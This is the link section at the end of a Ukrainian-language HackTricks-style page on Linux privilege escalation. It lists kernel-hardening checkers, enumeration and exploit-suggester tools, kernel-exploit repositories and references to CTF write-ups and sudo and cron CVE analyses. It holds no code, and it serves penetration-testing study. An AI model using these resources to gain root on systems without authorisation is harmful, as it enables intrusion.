## Kernel Security Protections

- [https://github.com/a13xp0p0v/kconfig-hardened-check](https://github.com/a13xp0p0v/kconfig-hardened-check)
- [https://github.com/a13xp0p0v/linux-kernel-defence-map](https://github.com/a13xp0p0v/linux-kernel-defence-map)

## Додаткова допомога

[Static impacket binaries](https://github.com/ropnop/impacket_static_binaries)

## Linux/Unix Privesc Tools

### **Найкращий tool для пошуку векторів локального підвищення привілеїв у Linux:** [**LinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS)

**LinEnum**: [https://github.com/rebootuser/LinEnum](https://github.com/rebootuser/LinEnum)(-t option)\
**Enumy**: [https://github.com/luke-goddard/enumy](https://github.com/luke-goddard/enumy)\
**Unix Privesc Check:** [http://pentestmonkey.net/tools/audit/unix-privesc-check](http://pentestmonkey.net/tools/audit/unix-privesc-check)\
**Linux Priv Checker:** [www.securitysift.com/download/linuxprivchecker.py](http://www.securitysift.com/download/linuxprivchecker.py)\
**BeeRoot:** [https://github.com/AlessandroZ/BeRoot/tree/master/Linux](https://github.com/AlessandroZ/BeRoot/tree/master/Linux)\
**Kernelpop:** Перелік kernel vulns у Linux і MAC [https://github.com/spencerdodd/kernelpop](https://github.com/spencerdodd/kernelpop)\
**Mestaploit:** _**multi/recon/local_exploit_suggester**_\
**Linux Exploit Suggester:** [https://github.com/mzet-/linux-exploit-suggester](https://github.com/mzet-/linux-exploit-suggester)\
**EvilAbigail (physical access):** [https://github.com/GDSSecurity/EvilAbigail](https://github.com/GDSSecurity/EvilAbigail)\
**Recopilation of more scripts**: [https://github.com/1N3/PrivEsc](https://github.com/1N3/PrivEsc)

## References

- [1] [0xdf – HTB Planning (підвищення привілеїв через Crontab UI, повторне використання облікових даних zip -P)](https://0xdf.gitlab.io/2025/09/13/htb-planning.html)
- [2] [0xdf – HTB Era: підроблений payload .text_sig для monitor, що виконується через cron](https://0xdf.gitlab.io/2025/11/29/htb-era.html)
- [3] [0xdf – Holiday Hack Challenge 2025: обхід Neighborhood Watch (викрадення PATH через sudo env_keep)](https://0xdf.gitlab.io/holidayhack2025/act1/neighborhood-watch)
- [4] [alseambusher/crontab-ui](https://github.com/alseambusher/crontab-ui)
- [5] [Базове підвищення привілеїв у Linux](https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/)
- [6] [Посібник із підвищення привілеїв у Linux](https://payatu.com/guide-linux-privilege-escalation/)
- [7] [Атака й захист: методи підвищення привілеїв у Linux у 2016 році](https://pen-testing.sans.org/resources/papers/gcih/attack-defend-linux-privilege-escalation-techniques-2016-152744)
- [8] [Ніхто не очікував виконання команд!](http://0x90909090.blogspot.com/2015/07/no-one-expect-command-execution.html)
- [9] [Sudo (LD_PRELOAD) (підвищення привілеїв у Linux)](https://touhidshaikh.com/blog/?p=827)
- [10] [lpeworkshop – покроковий розбір лабораторних вправ - Linux.pdf](https://github.com/sagishahar/lpeworkshop/blob/master/Lab%20Exercises%20Walkthrough%20-%20Linux.pdf)
- [11] [frizb/Linux-Privilege-Escalation: поради та підказки щодо підвищення привілеїв у Linux](https://github.com/frizb/Linux-Privilege-Escalation)
- [12] [lucyoa/kernel-exploits](https://github.com/lucyoa/kernel-exploits)
- [13] [rtcrowley/linux-private-i: tool для переліку та підвищення привілеїв у Linux](https://github.com/rtcrowley/linux-private-i)
- [14] [Що таке Socket?](https://www.linux.com/news/what-socket/)
- [15] [Розбір Peppo (Proving Grounds)](https://muzec0318.github.io/posts/PG/peppo.html)
- [16] [Підключення до D-BUS](https://www.linuxjournal.com/article/7744)
- [17] [SUID Executables Linux Privilege Escalation](https://blog.certcube.com/suid-executables-linux-privilege-escalation/)
- [18] [Sudo Part-2 – підвищення привілеїв у Linux](https://juggernaut-sec.com/sudo-part-2-lpe)
- [19] [Як керувати ACL у Linux](https://linuxconfig.org/how-to-manage-acls-on-linux)
- [20] [Redhat/CentOS root через network-scripts](https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure&qid=e026a0c5f83df4fd532442e1324ffa4f)
- [21] [Що таке systemd?](https://www.linode.com/docs/guides/what-is-systemd/)
- [22] [0xdf – HTB Eureka (bash arithmetic injection через logs, загальний ланцюжок)](https://0xdf.gitlab.io/2025/08/30/htb-eureka.html)
- [23] [GNU Bash Manual – BASH_ENV (startup file для non-interactive режиму)](https://www.gnu.org/software/bash/manual/bash.html#index-BASH_005fENV)
- [24] [0xdf – HTB Environment (sudo env_keep BASH_ENV → root)](https://0xdf.gitlab.io/2025/09/06/htb-environment.html)
- [25] [0xdf – HTB Previous (sudo terraform dev_overrides + підвищення привілеїв через TF_VAR symlink)](https://0xdf.gitlab.io/2026/01/10/htb-previous.html)
- [26] [0xdf – HTB Slonik (копіювання pg_basebackup через cron → SUID bash)](https://0xdf.gitlab.io/2026/02/12/htb-slonik.html)
- [27] [NVISO – Ви називаєте це, VMware підвищує це (CVE-2025-41244)](https://blog.nviso.eu/2025/09/29/you-name-it-vmware-elevates-it-cve-2025-41244/)
- [28] [Stratascale – CVE-2025-32463: підвищення привілеїв через Sudo Chroot](https://www.stratascale.com/resource/cve-2025-32463-sudo-chroot-elevation-of-privilege/)
- [29] [Rich Mirch – уразливості Sudo CVE-2025-32462 і CVE-2025-32463 для підвищення привілеїв](https://blog.mirch.io/sudo-elevation-of-privilege-vulnerabilities/)
- [30] [0xdf – HTB: Browsed](https://0xdf.gitlab.io/2026/03/28/htb-browsed.html)
- [31] [PEP 3147 – каталоги репозиторіїв PYC](https://peps.python.org/pep-3147/)
- [32] [Документація Python importlib](https://docs.python.org/3/library/importlib.html)
- [33] [Проблема #74 у polkit/polkit](https://gitlab.freedesktop.org/polkit/polkit/issues/74)
- [34] [mirchr/security-research](https://github.com/mirchr/security-research/blob/master/vulnerabilities/CVE-2018-19788.sh)
- [35] [Твіт @paragonsec](https://twitter.com/paragonsec/status/1071152249529884674)
- [36] [redsiege.com - журналювання паролів у Linux](https://www.redsiege.com/blog/2019/05/logging-passwords-on-linux)
- [37] [tech.feedyourhead.at - деталі race condition у logrotate](https://tech.feedyourhead.at/content/details-of-a-logrotate-race-condition)
{{#include ../../../banners/hacktricks-training.md}}
